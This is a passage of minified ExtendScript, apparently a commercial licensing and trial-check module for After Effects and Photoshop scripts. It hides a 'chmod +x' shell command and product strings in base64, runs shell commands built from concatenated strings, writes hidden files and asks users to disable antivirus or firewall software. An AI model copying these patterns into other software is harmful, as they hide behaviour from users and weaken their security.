        ? bD(getSettings(prefsSectionName, prefsName))
        : "";
      return check_v2_License(e) ? e : "";
    }
    function trial_expired() {
      var e = confirm(strExpiredAlert);
      isSecurityPrefSet() && e
        ? openURL(strTrialUrl)
        : e && isAE() && alert(strErrScriptAccess);
    }
    function bD(e) {
      var o = "";
      var l = 0;
      e = e.replace(/[^A-Za-z0-9\+\/\=]/g, "");
      for (
        var c =
          "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
        l < e.length;
      ) {
        i =
          (c.indexOf(e.charAt(l++)) << 2) |
          ((r = c.indexOf(e.charAt(l++))) >> 4);
        t = ((15 & r) << 4) | ((a = c.indexOf(e.charAt(l++))) >> 2);
        n = ((3 & a) << 6) | (s = c.indexOf(e.charAt(l++)));
        o += String.fromCharCode(i);
        64 != a && (o += String.fromCharCode(t));
        64 != s && (o += String.fromCharCode(n));
      }
      return o;
    }
    function bE(e) {
      for (
        i,
          t,
          n,
          r,
          a,
          s,
          o,
          l = "",
          c = 0,
          f =
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
        c < e.length;
      ) {
        r = (i = e.charCodeAt(c++)) >> 2;
        a = ((3 & i) << 4) | ((t = e.charCodeAt(c++)) >> 4);
        s = ((15 & t) << 2) | ((n = e.charCodeAt(c++)) >> 6);
        o = 63 & n;
        isNaN(t) ? (s = o = 64) : isNaN(n) && (o = 64);
        l = l + f.charAt(r) + f.charAt(a) + f.charAt(s) + f.charAt(o);
      }
      return l;
    }
    function isSecurityPrefSet() {
      var e =
        parseFloat(app.version) < 12
          ? "Main Pref Section"
          : "Main Pref Section v2";
      return (
        1 ==
        app.preferences.getPrefAsLong(e, "Pref_SCRIPTING_FILE_NETWORK_SECURITY")
      );
    }
    function openURL(e) {
      if (
        ((e = e.toString()).match(/@/) ||
          e.match(/^https?:\/\//) ||
          (e = "http://" + e.replace(/^(http)?s?:?\/?\/?/, "")),
        isAE() || isPS())
      ) {
        Folder.commonFiles.parent.fsName;
        -1 != $.os.indexOf("Windows")
          ? systemCall('cmd /c "start ' + (e = e.replace(/&/g, "^&")) + '"')
          : systemCall('open "' + e + '"');
      } else {
        createFile(
          File(Folder.temp.fsName + "/openUrl.url"),
          "[InternetShortcut]\rURL=" + e + "\r",
          "UTF-8",
          true,
        ).execute();
      }
    }
    function parseRegistration(e) {
      if (0 == retProp("^r", licenseValidity)) {
        if (
          ((a = retProp("^f", licenseValidity)),
          (s = retProp("^la", licenseValidity)),
          (o = retProp("^n", licenseValidity)),
          (l = retProp("pe$", licenseValidity)),
          isTimeLimited &&
            (parseDateString(retProp("rt$", licenseValidity)),
            (f = parseDateString(retProp("nd$", licenseValidity)))),
          0 < e)
        ) {
          return a + "\'" + s + "\'" + retProp("^s", licenseValidity) + l + o;
        }
        n = a + s.toString().match(/^@/) ? "" : " " + s + " ";
        r = l;
      } else {
        n = "";
      }
      var d = strUsers.replace("%u", o) + (1 < o) && "de" != locale ? "s" : "";
      switch (r) {
        case bD("U1VM"):
          i = " - " + strLicense + " " + d;
          break;
        case bD("QlRB"):
          i = " - " + strBTA + " " + d;
          break;
        case bD("RURV"):
          i = " - " + strEDU + " " + d;
          break;
        case bD("RkxU"):
          i = " - " + strFLT + " " + d;
          break;
        default:
          c = retProp("^t", licenseValidity);
          isTimeLimited ||
            (i = c < 1 ? strTrialExpired : strTrialTxt.replace(/%E/, c));
      }
      return (
        (t = "" != n ? strRegistration + n + i : i),
        isTimeLimited && (t += "\n" + strLicenseEnds + f),
        t
      );
    }
    function parseDateString(e) {
      var i = e.toString().split("-");
      return new Date(
        parseInt(i[0]),
        parseInt(i[1] - 1),
        parseInt(i[2]),
      ).toDateString();
    }
    function retProp(e, i) {
      for (var t in i) {
        if (i.hasOwnProperty(t) && t.toString().match(new RegExp(e))) {
          return i[t];
        }
      }
      return "";
    }
    function isAE() {
      return BridgeTalk.appName.match(new RegExp(bD("YWZ0ZXJlZmZlY3Rz")));
    }
    function isPS() {
      return BridgeTalk.appName.match(new RegExp(bD("cGhvdG9zaG9w")));
    }
    function readFile(e) {
      if (null != e && null != e && e.exists && e.open("r")) {
        var i = e.read();
        return (e.close(), i);
      }
      return null;
    }
    function createFile(e, i, t, n, r) {
      return (
        ((null == e || null == e || e.exists) && !n) ||
          (e.exists && e.remove(),
          ((e =
            -1 != $.os.indexOf("Win")
              ? new File(e.fsName)
              : new File(e.absoluteURI)).encoding = t),
          e.open("w"),
          e.write(i),
          e.close(),
          (null != r && r) || (e.hidden = true),
          -1 != $.os.indexOf("Mac") &&
            systemCall(bD("Y2htb2QgK3gg") + e.absoluteURI)),
        e
      );
    }
    function systemCall(e) {
      if (isAE()) {
        return system.callSystem(e);
      }
      if (isPS()) {
        var i =
          -1 != $.os.indexOf("Win")
            ? Folder.temp.fsName
            : Folder.temp.absoluteURI +
              "/" +
              Math.round(Math.random() * 71827 * new Date().getTime());
        return (app.system(e + " > " + i), readFile(File(i)));
      }
      return "";
    }
    function parseSettings(e, i) {
      for (var t in i) {
        if (i.hasOwnProperty(t)) {
          if ("object" == typeof i[t]) {
            return parseSettings(e, i[t]);
          }
          if (t === e) {
            return i[t];
          }
        }
      }
    }
    function readJSON(e) {
      if (null == e || null == e) {
        return false;
      }
      e instanceof File || File(e);
      var i = readFile(e);
      return JSONify(i, "parse");
    }
    function writeJSON(e, i) {
      if (null == e || null == e || null == i || null == i) {
        return false;
      }
      i instanceof File || File(i);
      return (
        createFile(i, JSONify(e, "stringify", "\t"), "UTF-8", true, true),
        i.exists
      );
    }
    function getSettings(e, i, t) {
      if (isAE() && "settings" != t) {
        return app.settings.getSetting(e, i);
      }
      var n = File(prefsLocation + prefsPrefix + File.encode(e));
      var r = readFile(n);
      var a = JSONify(r, "parse");
      if (a instanceof Array) {
        for (var s in ((a = fixSettingsFile(a)), n.remove(), a)) {
          saveSettings(e, s, a[s]);
        }
      }
      return a[i];
    }
    function haveSettings(e, i, t) {
      if (isAE() && "settings" != t) {
        return app.settings.haveSetting(e, i);
      }
      var n = readFile(File(prefsLocation + prefsPrefix + File.encode(e)));
      if (null != n) {
        var r = JSONify(n.toString(), "parse");
        return (r instanceof Array && (r = fixSettingsFile(r)), i in r);
      }
      return false;
    }
    function fixSettingsFile(e) {
      for (var i = {}, t = 0; t < e.length - 1; t++) {
        i[e[t]] = e[t + 1];
        t++;
      }
      return i;
    }
    function saveSettings(e, i, t, n) {
      if (isAE() && "settings" != n) {
        app.settings.saveSetting(e, i, t);
        app.preferences.saveToDisk();
      } else {
        var r = {};
        var a = File(prefsLocation + prefsPrefix + File.encode(e));
        if (a.exists) {
          var s = readFile(a);
          null != s && (r = JSONify(s.toString(), "parse"));
        }
        r instanceof Array && (r = fixSettingsFile(r));
        r[i] = t;
        createFile(
          File(prefsLocation + prefsPrefix + File.encode(e)),
          JSONify(r, "stringify", "\t"),
          "UTF-8",
          true,
        );
      }
    }
    function saveVersionsToPrefs() {
      saveSettings(prefsSectionName, prefsVersionName, strScriptVersion);
      saveSettings(prefsSectionName, prefsLicVersion, licensingVersion);
    }
    function isVT() {
      return (
        (void 0 !== licenseValidity &&
          licenseValidity.hasOwnProperty("result")) ||
          (licenseValidity = getVerifCode("")),
        isResultValidLicense(licenseValidity) &&
          isResultTrial(licenseValidity.result)
      );
    }
    function getRegistration(e) {
      return (
        (void 0 !== licenseValidity &&
          licenseValidity.hasOwnProperty("result")) ||
          (licenseValidity = getVerifCode("")),
        parseRegistration(e)
      );
    }
    function removeLic() {
      (void 0 !== licenseValidity &&
        licenseValidity.hasOwnProperty("result")) ||
        (licenseValidity = getVerifCode(""));
      var e =
        isServerConfigured(licenseValidity) && isServerRunning(licenseValidity)
          ? strHeader + "@REMOTE"
          : "";
      return (
        (licenseValidity = getVerifCode("-" + e)),
        (theLicense = false),
        alert(strScriptName + ": " + strLicenseRemoved),
        isServerConfigured(licenseValidity) ||
          (saveSettings(prefsSectionName, prefsName, bE("bad")),
          saveSettings(prefsSectionName, prefsVersionName, strScriptVersion),
          saveSettings(prefsSectionName, prefsLicVersion, licensingVersion)),
        !theLicense
      );
    }
    function mainFunc(e) {
      if (
        !isAE() ||
        isSecurityPrefSet() ||
        (alert(strErrScriptAccess),
        parseFloat(app.version) < 16.1
          ? app.executeCommand(2359)
          : app.executeCommand(3131),
        isSecurityPrefSet())
      ) {
        if (betaMode && checkBeta(betaExpirationDate, betaStartDate)) {
          "l" == e && alert(strBetaExpiredAlert);
        } else {
          if ("l" == e || "c" == e || "r" == e) {
            var n = false;
            if (
              ("l" == e && doUpdateCheck && checkForNewVersion(), 2 == licV)
            ) {
              if ("r" == e) {
                t = !removeLic();
              } else {
                if ("-22" == (licenseValidity = getVerifCode("")).result) {
                  var r =
                    "e" in licenseValidity ? "\n" + licenseValidity.e : "";
                  alert(
                    licErrors[locale][checkErrorCode(licenseValidity.result)]
                      .title +
                      "\n" +
                      licErrors[locale][checkErrorCode(licenseValidity.result)]
                        .detail +
                      r,
                  );
                  getVerifCode("-");
                  n = true;
                  i =
                    isServerConfigured(licenseValidity) &&
                    isServerRunning(licenseValidity)
                      ? "@REMOTE"
                      : "trial";
                }
                if (
                  isResultValidLicense(licenseValidity) &&
                  !isResultTrial(licenseValidity.result)
                ) {
                  return true;
                }
                "" == (i = checkForLegacyLic()) &&
                  ((n = true),
                  (i =
                    isServerConfigured(licenseValidity) &&
                    isServerRunning(licenseValidity)
                      ? "@REMOTE"
                      : "trial"));
                t = checkCode(n, i, privateNum);
              }
            } else {
              haveSettings(prefsSectionName, prefsName)
                ? ((i = getSettings(prefsSectionName, prefsName)),
                  (n = !(
                    "c" == e ||
                    !(
                      ("bad" == i || "bad" == bD(i) || offerTrial) &&
                      "trial" == bD(i)
                    )
                  )))
                : "c" == e
                  ? (saveSettings(
                      prefsSectionName,
                      prefsName,
                      bE((i = !isTimeLimited && offerTrial ? "trial" : "")),
                    ),
                    saveSettings(
                      prefsSectionName,
                      prefsVersionName,
                      strScriptVersion,
                    ),
                    saveSettings(
                      prefsSectionName,
                      prefsLicVersion,
                      licensingVersion,
                    ),
                    (n = false))
                  : (n = true);
              t = checkCode(n, i, privateNum);
            }
            return t;
          }
        }
      }
    }
    var licensingVersion = "3.0.43";
    null == vars.scriptName &&
      alert("scriptName variable missing in settings object");
    var strScriptName = vars.scriptName;
    null == vars.scriptVersion &&
      alert("scriptVersion variable missing in settings object");
    var strScriptVersion = vars.scriptVersion;
    null == vars.scriptURL &&
      alert("scriptURL variable missing in settings object");
    var strTrialUrl = vars.scriptURL;
    null == vars.privateNumber &&
      alert("privateNumber variable missing in settings object");
    var privateNum = vars.privateNumber;
    null == vars.productSKU &&
      alert("productSKU variable missing in settings object");
    var strSKU = vars.productSKU;
    var strSKUArray = strSKU.toString().split("-");
    if (null == strSKUArray || 2 != strSKUArray.length) {
      return (
        alert(
          "Product SKU incorrectly entered in settings. Should looks like this: XXXX-SUL",
        ),
        false
      );
    }
    null == vars.helpText && (vars.helpText = "");
    null == vars.helpButtons && (vars.helpButtons = []);
    var isTimeLimited =
      vars.hasOwnProperty("isTimeLimited") && vars.isTimeLimited;
    var strHeader = strSKUArray[0];
    var betaSupportEmail = vars.hasOwnProperty("betaSupportEmail")
      ? vars.betaSupportEmail
      : "";
    var offerTrial = !vars.hasOwnProperty("offerTrial") || vars.offerTrial;
    var tLD = vars.hasOwnProperty("tLDXX")
      ? vars.tLDX
      : Math.round(Math.sqrt(parseInt(bD("NTU3Ng==").substr(0, 2))));
    var betaMode = !!vars.hasOwnProperty("offerBeta") && vars.offerBeta;
    if (betaMode) {
      null == vars.betaStartDate &&
        alert("betaStartDate variable missing in settings object");
      var betaStartDate = vars.betaStartDate;
      null == vars.betaExpirationDate &&
        alert("betaExpirationDate variable missing in settings object");
      var betaExpirationDate = vars.betaExpirationDate;
    }
    var supportEmail =
      vars.hasOwnProperty("externalSupportURL") && "" != vars.externalSupportURL
        ? vars.externalSupportURL
        : "http://aescripts.com/contact";
    betaMode && "" != betaSupportEmail && (supportEmail = betaSupportEmail);
    var aescriptsSupportUrl = "https://aescripts.com/contact";
    var supportUrl =
      vars.hasOwnProperty("externalSupportURL") && "" != vars.externalSupportURL
        ? vars.externalSupportURL
        : aescriptsSupportUrl;
    var isAescriptsSupportUrl = supportUrl === aescriptsSupportUrl;
    isAescriptsSupportUrl &&
      (supportUrl = supportUrl.replace(/\/*/, "") + "/?direct=1&sku=");
    var aescriptsRetrieveUrl =
      "https://aescripts.com/downloadable/customer/products";
    var retrieveUrl =
      vars.hasOwnProperty("retrieveLicenseURL") && "" != vars.retrieveLicenseURL
        ? vars.retrieveLicenseURL
        : aescriptsRetrieveUrl;
    var exchangeUrl = "https://license.aescripts.com/exchange";
    var useLegacyPrefsHeader =
      !!vars.hasOwnProperty("useLegacyPrefsHeader") &&
      vars.useLegacyPrefsHeader;
    var managerAppUrl =
      "https://aescripts.com/learn/aescripts-aeplugins-manager-app/";
    var remindMeLaterDays = 7;
    var doUpdateCheck =
      !vars.hasOwnProperty("doUpdateCheck") || vars.doUpdateCheck;
    var updateCheckInterval = 5;
    var maxUIButtons = 3;
    var licV = 2;
    var wx = __BLOB__BLOB_000533__;
    var mx = __BLOB__BLOB_000534__;
    function JSONify(string, mode, prettyJSON) {
      if (typeof JSON !== "object") {
        JSON = {};
      }
      (function () {
        function f(n) {
          return n < 10 ? "0" + n : n;
        }
        function this_value() {
          return this.valueOf();
        }
        function quote(string) {
          rx_escapable.lastIndex = 0;
          return rx_escapable.test(string)
            ? '"' +
                string.replace(rx_escapable, function (a) {
                  var c = meta[a];
                  return typeof c === "string"
                    ? c
                    : "\\u" + ("0000" + a.charCodeAt(0).toString(16)).slice(-4);
                }) +
                '"'
            : '"' + string + '"';
        }
        function str(key, holder) {
          var mind = gap;
          var value = holder[key];
          if (
            value &&
            typeof value === "object" &&
            typeof value.toJSON === "function"
          ) {
            value = value.toJSON(key);
          }
          if (typeof rep === "function") {
            value = rep.call(holder, key, value);
          }
          switch (typeof value) {
            case "string":
              return quote(value);
            case "number":
              return isFinite(value) ? String(value) : "null";
            case "boolean":
            case "null":
              return String(value);
            case "object":
              if (!value) {
                return "null";
              }
              gap += indent;
              partial = [];
              if (Object.prototype.toString.apply(value) === "[object Array]") {
                length = value.length;
                for (var i = 0; i < length; i += 1) {
                  partial[i] = str(i, value) || "null";
                }
                v =
                  partial.length === 0
                    ? "[]"
                    : gap
                      ? "[\n" +
                        gap +
                        partial.join(",\n" + gap) +
                        "\n" +
                        mind +
                        "]"
                      : "[" + partial.join(",") + "]";
                gap = mind;
                return v;
              }
              if (rep && typeof rep === "object") {
                length = rep.length;
                for (var i = 0; i < length; i += 1) {
                  if (typeof rep[i] === "string") {
                    k = rep[i];
                    v = str(k, value);
                    if (v) {
                      partial.push(quote(k) + gap ? ": " : ":" + v);
                    }
                  }
                }
              } else {
                for (var k in value) {
                  if (Object.prototype.hasOwnProperty.call(value, k)) {
                    v = str(k, value);
                    if (v) {
                      partial.push(quote(k) + gap ? ": " : ":" + v);
                    }
                  }
                }
              }
              v =
                partial.length === 0
                  ? "{}"
                  : gap
                    ? "{\n" +
                      gap +
                      partial.join(",\n" + gap) +
                      "\n" +
                      mind +
                      "}"
                    : "{" + partial.join(",") + "}";
              gap = mind;
              return v;
          }
        }
        ("use strict");
        var rx_one = /^[\],:{}\s]*$/;
        var rx_two = /\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g;
        var rx_three =
          /"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g;
        var rx_four = /(?:^|:|,)(?:\s*\[)+/g;
        var rx_escapable =
          /[\\\"\u0000-\u001f\u007f-\u009f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g;
        var rx_dangerous =
          /[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g;
        if (typeof Date.prototype.toJSON !== "function") {
          Date.prototype.toJSON = function () {
            return isFinite(this.valueOf())
              ? this.getUTCFullYear() +
                  "-" +
                  f(this.getUTCMonth() + 1) +
                  "-" +
                  f(this.getUTCDate()) +
                  "T" +
                  f(this.getUTCHours()) +
                  ":" +
                  f(this.getUTCMinutes()) +
                  ":" +
                  f(this.getUTCSeconds()) +
                  "Z"
              : null;
          };
          Boolean.prototype.toJSON = this_value;
          Number.prototype.toJSON = this_value;
          String.prototype.toJSON = this_value;
        }
        if (typeof JSON.stringify !== "function") {
          meta = {
            "\b": "\\b",
            "\t": "\\t",
            "\n": "\\n",
            "\f": "\\f",
            "\r": "\\r",
            '"': '\\"',
            "\\": "\\\\",
          };
          JSON.stringify = function (value, replacer, space) {
            gap = "";
            indent = "";
            if (typeof space === "number") {
              for (var i = 0; i < space; i += 1) {
                indent += " ";
              }
            } else {
              if (typeof space === "string") {
                indent = space;
              }
            }
            rep = replacer;
            if (
              replacer &&
              typeof replacer !== "function" &&
              (typeof replacer !== "object" ||
                typeof replacer.length !== "number")
            ) {
              throw new Error("JSON.stringify");
            }
            return str("", { "": value });
          };
        }
      })();
      var jsonParse = (function () {
        function v(h, j, e) {
          return j ? u[j] : String.fromCharCode(parseInt(e, 16));
        }
        var r =
          "(?:-?\\b(?:0|[1-9][0-9]*)(?:\\.[0-9]+)?(?:[eE][+-]?[0-9]+)?\\b)";
        var k =
          '(?:[^\\0-\\x08\\x0a-\\x1f"\\\\]|\\\\(?:["/\\\\bfnrt]|u[0-9A-Fa-f]{4}))';
        k = '(?:"' + k + '*")';
        var s = new RegExp(
          "(?:false|true|null|[\\{\\}\\[\\]]|" + r + "|" + k + ")",
          "g",
        );
        var t = new RegExp("\\\\(?:([^u])|u(.{4}))", "g");
        var u = {
          '"': '"',
          "/": "/",
          "\\": "\\",
          b: "\b",
          f: "\f",
          n: "\n",
          r: "\r",
          t: "\t",
        };
        var w = new String("");
        var x = Object.hasOwnProperty;
        return function (h, j) {
          h = h.match(s);
          var c = h[0];
          var l = false;
          if ("{" === c) {
            e = {};
          } else if ("[" === c) {
            e = [];
          } else {
            e = [];
            l = true;
          }
          for (b, d = [e], m = 1 - l, y = h.length; m < y; ++m) {
            c = h[m];
            switch (c.charCodeAt(0)) {
              default:
                a = d[0];
                a[b || a.length] = c;
                b = void 0;
                break;
              case 34:
                c = c.substring(1, c.length - 1);
                if (c.indexOf("\\") !== -1) {
                  c = c.replace(t, v);
                }
                a = d[0];
                if (!b) {
                  if (a instanceof Array) {
                    b = a.length;
                  } else {
                    b = c || w;
                    break;
                  }
                }
                a[b] = c;
                b = void 0;
                break;
              case 91:
                a = d[0];
                d.unshift((a[b || a.length] = []));
                b = void 0;
                break;
              case 93:
                d.shift();
                break;
              case 102:
                a = d[0];
                a[b || a.length] = false;
                b = void 0;
                break;
              case 110:
                a = d[0];
                a[b || a.length] = null;
                b = void 0;
                break;
              case 116:
                a = d[0];
                a[b || a.length] = true;
                b = void 0;
                break;
              case 123:
                a = d[0];
                d.unshift((a[b || a.length] = {}));
                b = void 0;
                break;
              case 125:
                d.shift();
                break;
            }
          }
          if (l) {
            if (d.length !== 1) {
              throw new Error();
            }
            e = e[0];
          } else {
            if (d.length) {
              throw new Error();
            }
          }
          if (j) {
            var p = function (n, o) {
              var f = n[o];
              if (f && typeof f === "object") {
                var i = null;
                for (var g in f) {
                  if (x.call(f, g) && f !== n) {
                    var q = p(f, g);
                    if (q !== void 0) {
                      f[g] = q;
                    } else {
                      i || (i = []);
                      i.push(g);
                    }
                  }
                }
                if (i) {
                  for (g = i.length; --g >= 0; ) {
                    delete f[i[g]];
                  }
                }
              }
              return j.call(n, o, f);
            };
            e = p({ "": e }, "");
          }
          return e;
        };
      })();
      try {
        switch (mode) {
          case "parse":
            if (
              /^[\],:{}\s]*$/.test(
                string
                  .replace(/\\["\\\/bfnrtu]/g, "@")
                  .replace(
                    /"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,
                    "]",
                  )
                  .replace(/(?:^|:|,)(?:\s*\[)+/g, ""),
              )
            ) {
              return jsonParse(string);
            } else {
              alert("JSON validation error\n" + string.substring(0, 1000));
            }
            break;
          case "stringify":
            return JSON.stringify(string, undefined, prettyJSON);
            break;
        }
      } catch (e) {
        alert(e.toString());
      }
    }
    $.locale = isAE() ? app.isoLanguage : $.locale;
    var locale = $.locale.split("_")[0];
    ("fr" == locale && "de" == locale && "es" == locale) || (locale = "en");
    var strTempCode = localize({
      de:
        "Du hast eine tempor\xe4re Seriennummer eingegeben, die gegen eine permanente Lizenz eingetauscht werden muss.\n\nSobald Du eine permanente Lizenz erhalten hast, kannst Du sie verwenden um" +
        strScriptName +
        " zu registrieren.  Der Austausch ist schnell und unkompliziert, gehe einfach zu:\n\n" +
        exchangeUrl +
        "\n\nWillst Du jetzt dorthin gehen?",
      en:
        "You entered a temporary serial number that needs to be exchanged for a permanent license.\n\nOnce you obtain your permanent license you can use it to register " +
        strScriptName +
        ".  It is quick and easy to exchange it, simply go to:\n\n" +
        exchangeUrl +
        "\n\nWould you like to go there now?",
      es:
        "Ha introducido un n\xfamero de serie provisional que necesita ser sustituido por una licencia permanente.\n\nUna vez obtenga una licencia permamente puede usarla para registrar " +
        strScriptName +
        ". Reemplazarla es r\xe1pido y sencillo, simplemente vaya a:\n\n" +
        exchangeUrl +
        "\n\n\xbfQuiere ir all\xed ahora?",
      fr:
        "Vous avez entr\xe9 un num\xe9ro de s\xe9rie temporaire devant \xeatre \xe9chang\xe9 contre une licence permanente.\n\nUne fois votre licence permanente acquise, vous pouvez l\'utiliser pour vous enregistrer " +
        strScriptName +
        ".  Le changement est rapide et facile,  allez simplement \xe0:\n\n" +
        exchangeUrl +
        "\n\nVoulez-vous y aller maintenant?",
    });
    var strExpiredAlert = localize({
      de:
        "Die Testversion ist leider abgelaufen.\nDu kannst unter " +
        strTrialUrl +
        " eine Lizenz erwerben.\n\nM\xf6chtest Du jetzt dorthin gehen?",
      en:
        "Sorry, this trial version has expired. \nYou can purchase a license at " +
        strTrialUrl +
        "\n\nWould you like to go there now?",
      es:
        "Lo siento, esta versi\xf3n de prueba ha expirado.\nPuede obtener una licencia en" +
        strTrialUrl +
        "\n\n\xbfQuiere ir all\xed ahora?",
      fr:
        "D\xe9sol\xe9, la p\xe9riode d\'essai a expir\xe9.\nPour acheter une licence, veuillez vous rendre sur la page " +
        strTrialUrl +
        "\n\nVoulez-vous ouvrir cette page maintenant ?",
    });
    var strBetaExpiredAlert = localize({
      de: "Die Betaversion ist leider abgelaufen",
      en: "Sorry, this beta version has expired",
      es: "Lo siento est\xe1 versi\xf3n beta ha expirado",
      fr: "D\xe9sol\xe9, la p\xe9riode beta a expir\xe9",
    });
    var strBetaCodeAlert = localize({
      de:
        "Beta Lizenzcode erkannt f\xfcr " +
        strScriptName +
        "\nBeta Lizenzen k\xf6nnen nur f\xfcr Betaversionen verwendet werden. Bitte verwende eine normale Lizenz f\xfcr diese Version.",
      en:
        "Beta license code detected for " +
        strScriptName +
        "\nBeta license codes can only be used on beta versions, please obtain a normal license to use this version.",
      es:
        "Licencia beta detectada para " +
        strScriptName +
        "\nLas licencias beta s\xf3lo pueden ser usadas con versiones beta, por favor obtenga una licencia normal para usar esta versi\xf3n.",
      fr:
        "Licence beta d\xe9tect\xe9e pour " +
        strScriptName +
        "\nLes codes pour licence beta ne peuvent \xeatre utilis\xe9s que pour les versions beta, merci de demander une licence r\xe9guli\xe8re pour utiliser cette version.",
    });
    var strBetaLicReq = localize({
      de: "F\xfcr diese Betaversion wird eine Lizenz ben\xf6tigt.\nBitte kontaktiere den Autor f\xfcr eine Betatester-Lizenz.",
      en: "A license is required to run this beta version\nPlease contact the author for a beta testing license.",
      es: "Es necesaria una licencia para utilizar esta versi\xf3n beta.\nPor favor, p\xf3ngase en contacto con el autor para obtener una licencia beta.",
      fr: "Une licence est requise pour ex\xe9cuter cette version beta\nMerci de contacter l\'auteur pour une licence beta de test.",
    });
    var strUsers = localize({
      de: "f\xfcr %u Nutzer",
      en: "for %u user",
      es: "para %u usuario",
      fr: "pour %u utilisateur",
    });
    var strRegSuccess = localize({
      de: "Registrierung erfolgreich " + strUsers,
      en: "Registration successful " + strUsers,
      es: "Registro completado " + strUsers,
      fr: "Enregistrement r\xe9ussi " + strUsers,
    });
    var strRegSuccess1 = localize({
      de: "Danke f\xfcr den Kauf von " + strScriptName,
      en: "Thank you for purchasing " + strScriptName,
      es: "Gracias por comprar " + strScriptName,
      fr: "Merci d\'avoir achet\xe9 " + strScriptName,
    });
    var strInvalidCode = localize({
      de: "Entschuldigung, der Lizenzcode ist nicht g\xfcltig.",
      en: "Sorry, the license code is not valid",
      es: "Lo siento, la licencia no es v\xe1lida",
      fr: "D\xe9sol\xe9, ce num\xe9ro de licence n\'est pas valide.",
    });
    var strFirewall = localize({
      de: "Eine Firewall oder ein Antivirus-Programm blockiert den Lizenz-Prozess. Bitte deaktiviere das Antivirus-Programm oder konfiguriere das System so, dass die Lizenz verifiziert werden kann.",
      en: "A firewall or virus protection software is blocking the licensing process.  Please disable this or configure it to allow this process so that the license can be verified.",
      es: 'Un software de "firewall" o de protecci\xf3n antivirus est\xe1 bloqueando el proceso de concesi\xf3n de licencias. Desactivela o configurela para permitir este proceso para que la licencia puede ser verificada.',
      fr: "Un logiciel pare-feu ou un logiciel antivirus bloque le processus de v\xe9rification de licence. Veuillez le d\xe9sactiver ou le configurer pour permettre \xe0 ce processus de v\xe9rifier la licence.",
    });
    var strContactSupport = localize({
      de: "Wenn Du Hilfe ben\xf6tigst, kontaktiere bitte " + supportEmail,
      en: "If you require assistance please contact " + supportEmail,
      es: "Si necesita ayuda, por favor contacte " + supportEmail,
      fr: "Si vous avez besoin d\'aide, merci de contacter " + supportEmail,
    });
    var strCorruptedCode = localize({
      de:
        "Entschuldigung, irgendetwas ist mit dem " +
        strScriptName +
        " Lizenzcode passiert. Bitte gebe ihn erneut ein.\n\n" +
        strContactSupport,
      en:
        "Sorry, something must have happened to the " +
        strScriptName +
        " license code.  Please re-enter it at the prompt.\n" +
        strContactSupport,
      es:
        "Lo siento, algo ha ocurrido con la licencia de " +
        strScriptName +
        ". Por favor, vuelva a introducirla en la casilla.\n" +
        strContactSupport,
      fr:
        "D\xe9sol\xe9, il y a eu un probl\xe8me avec le num\xe9ro de licence pour " +
        strScriptName +
        ". Merci de bien vouloir le saisir \xe0 nouveau.n\n" +
        strContactSupport,
    });
    var strTrialThanks = localize({
      de: "Danke, dass Du " + strScriptName + " ausprobierst!",
      en: "Thanks for trying " + strScriptName + "!",
      es: "\xa1Gracias por probar " + strScriptName + "!",
      fr: "Merci d\'avoir essay\xe9 " + strScriptName + "!",
    });
    var strTrialTxt = localize({
      de: "Testversion - noch %E Tage g\xfcltig",
      en: "Trial version - %E days left",
      es: "Versi\xf3n de prueba - faltan %E d\xedas",
      fr: "Version d\'\xe9valuation - %E jour(s) restant",
    });
    var strTrialTxt2 = localize({
      de: "%E Programmstarts \xfcbrig f\xfcr die Testversion",
      en: "%E launches left in the trial",
      es: "%E usos restantes de la versi\xf3n de prueba",
      fr: "Il vous reste %E essais",
    });
    var strTrialWelcomeHeader = localize({
      de: "Willkommen bei " + strScriptName,
      en: "Welcome to " + strScriptName,
      es: "Bienvenido a " + strScriptName,
      fr: "Bienvenue sur " + strScriptName,
    });
    var strOK = localize({ de: "OK", en: "OK", es: "OK", fr: "OK" });
    var strCancel = localize({
      de: "Abbrechen",
      en: "Cancel",
      es: "Cancelar",
      fr: "Annuler",
    });
    var strGetSupport = localize({
      de: "Support zu erhalten",
      en: "Get support",
      es: "Obtener apoyo",
      fr: "Contacter le support client",
    });
    var strRetrieveLic = localize({
      de: "%t vergessen?",
      en: "Retrieve %t",
      es: "Recuperar %t",
      fr: "Retrouver votre %t",
    });
    var strBuyLic = localize({
      de: "%t Kaufen",
      en: "Buy %t",
      es: "Compra %t",
      fr: "Acheter une %t",
    });
    var strLicense = localize({
      de: "Lizenz",
      en: "License",
      es: "licencia",
      fr: "Licence",
    });
    var strDownloads = localize({
      de: "Download",
      en: "Download",
      es: "Descarga",
      fr: "T\xe9l\xe9chargement",
    });
    var strPpcNotSupported = localize({
      de: "PowerPC (PPC) Prozessoren werden leider nicht unterst\xfctzt. Bitte kontaktiere den Support f\xfcr weitere Informationen.",
      en: "Sorry, PowerPC (PPC) processors are not supported, please contact support for further assistance.",
      es: "Lo siendto, los procesadores PowerPC (PPC) no est\xe1n soportados, por favor contacte con soporte para m\xe1s informaci\xf3n.",
      fr: "D\xe9sol\xe9, les processeurs PowerPC (PPC) ne sont pas support\xe9s, veuillez contacter le service client\xe8le pour plus de d\xe9tails.",
    });
    var strAllowScriptsPrefsSection =
      parseFloat(app.version) < 16.1
        ? localize({
            de: "Allgemein",
            en: "General",
            es: "General",
            fr: "G\xe9n\xe9ral",
          })
        : localize({
            de: "Skripterstellung und Expression",
            en: "Scripting & Expressions",
            es: "Escripts y expresi\xf3nes",
            fr: "Scripts et expressions",
          });
    var strErrScriptAccess = localize({
      de:
        strScriptName +
        ' ben\xf6tigt die Erlaubnis Dateien zu schreiben\n Gehe in Voreinstellungen von After Effects in die Rubrik "' +
        strAllowScriptsPrefsSection +
        '" und aktiviere die Option "Skripten k\xf6nnen Dateien schreiben und haben Netzwerkzugang".',
      en:
        strScriptName +
        ' requires access to write files\nGo to the "' +
        strAllowScriptsPrefsSection +
        '" panel of the application preferences and make sure "Allow Scripts to Write Files and Access Network" is checked.',
